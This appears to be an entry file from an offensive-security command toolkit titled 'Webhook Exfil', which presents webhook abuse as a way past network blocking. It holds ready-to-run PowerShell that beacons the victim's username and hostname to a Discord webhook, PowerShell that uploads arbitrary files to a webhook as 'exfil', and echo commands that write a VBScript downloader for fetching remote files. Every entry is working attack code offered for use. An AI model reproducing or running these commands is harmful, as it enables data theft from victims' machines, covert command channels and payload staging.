webhook-exfil.name: Webhook Exfil
webhook-exfil.description: Abuse write-only HTTPS webhook endpoints (Discord, Slack, Teams) to beacon and exfiltrate files. These domains are rarely blocked and require no authentication setup.

commands.name: Send text beacon (Discord PS)
commands.command:
$webhook = "https://discord.com/api/webhooks/{WEBHOOK_ID}/{WEBHOOK_TOKEN}"
$payload = @{ content = "beacon: $env:USERNAME @ $env:COMPUTERNAME" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
([System.Net.Http.HttpClient]::new()).PostAsync($webhook, $mp).Wait()
commands.note: HTTP 204 confirms delivery

commands.name: Upload file to Discord webhook
commands.command:
$webhook = "https://discord.com/api/webhooks/{WEBHOOK_ID}/{WEBHOOK_TOKEN}"
$bytes = [System.IO.File]::ReadAllBytes("{FILE}")
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = "exfil" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", "{FILE}")
([System.Net.Http.HttpClient]::new()).PostAsync($webhook, $mp).Wait()
commands.note: Sends file as multipart attachment; max 8MB on free Discord

commands.name: Create wget.vbs downloader
commands.command:
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
commands.note: Creates wget.vbs in current directory
